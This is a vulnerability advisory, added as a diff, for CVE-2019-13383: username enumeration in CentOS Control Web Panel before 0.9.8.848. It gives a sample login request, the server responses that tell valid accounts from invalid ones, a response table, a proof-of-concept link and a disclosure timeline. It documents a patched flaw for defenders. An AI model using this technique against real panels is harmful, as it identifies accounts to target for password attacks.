@@ -1,0 +1,119 @@
+# Exploit Title: CWP (CentOS Control Web Panel) < 0.9.8.848 User Enumeration via HTTP Response Message
+# Date: 15 July 2019
+# Exploit Author: Pongtorn Angsuchotmetee, Nissana Sirijirakal, Narin Boonwasanarak
+# Vendor Homepage: https://control-webpanel.com/changelog
+# Software Link: Not available, user panel only available for lastest version
+# Version: 0.9.8.836 to 0.9.8.847
+# Tested on: CentOS 7.6.1810 (Core)
+# CVE : CVE-2019-13383
+
+# ====================================================================
+# Information
+# ====================================================================
+
+Product     : CWP Control Web Panel
+version     : 0.9.8.838
+Fixed on    : 0.9.8.848
+Test on     : CentOS 7.6.1810 (Core)
+Reference   : https://control-webpanel.com/
+CVE-Number  : 2019-13383
+
+
+
+# ====================================================================
+# Root course of the vulnerability
+# ====================================================================
+The server response different message between login with valid and invalid user.
+This allows attackers to check whether a username is valid by reading the HTTP response.
+
+
+
+# ====================================================================
+# Steps to Reproduce
+# ====================================================================
+
+1. Login with a random user by using invalid password
+
+POST /login/index.php?acc=validate HTTP/1.1
+Host: 192.168.80.137:2083
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+csrftoken: d41d8cd98f00b204e9800998ecf8427e
+X-Requested-With: XMLHttpRequest
+Content-Length: 30
+Connection: close
+Referer: https://192.168.80.137:2083/login/?acc=logon
+
+username=AAA&password=c2Rmc2Rm
+
+
+
+2. Check the HTTP response body
+
+2.1 User does not exist (server response suspended)
+
+HTTP/1.1 200 OK
+Server: cwpsrv
+Date: Mon, 15 Jul 2019 01:39:06 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.0.32
+Content-Length: 9
+
+suspended
+
+
+2.2 User does exist (server response nothing)
+
+HTTP/1.1 200 OK
+Server: cwpsrv
+Date: Mon, 15 Jul 2019 01:40:12 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+X-Powered-By: PHP/7.0.32
+Content-Length: 0
+
+
+
+3. HTTP response body format depends on software version, but all of them keep responding differently as the example below
+
+------------------------------------------------------------
+|  Username  |	 Password   |   Result                     |
+
+------------------------------------------------------------
+|  valid     |	 valid	    |   login success              |
+
+|  valid     |	 invalid    |	{"error":"failed"}         |
+
+|  invalid   |	 invalid    |	{"error":"user_invalid"}   |
+------------------------------------------------------------
+
+
+
+# ====================================================================
+# PoC
+# ====================================================================
+https://github.com/i3umi3iei3ii/CentOS-Control-Web-Panel-CVE/blob/master/CVE-2019-13383.md
+
+
+
+# ====================================================================
+# Timeline
+# ====================================================================
+2019-07-06: Discovered the bug
+2019-07-06: Reported to vendor
+2019-07-06: Vender accepted the vulnerability
+2019-07-11: The vulnerability has been fixed
+2019-07-15: Published
+
+
+
+# ====================================================================
+# Discovered by
+# ====================================================================
+Pongtorn Angsuchotmetee
+Nissana Sirijirakal
+Narin Boonwasanarak
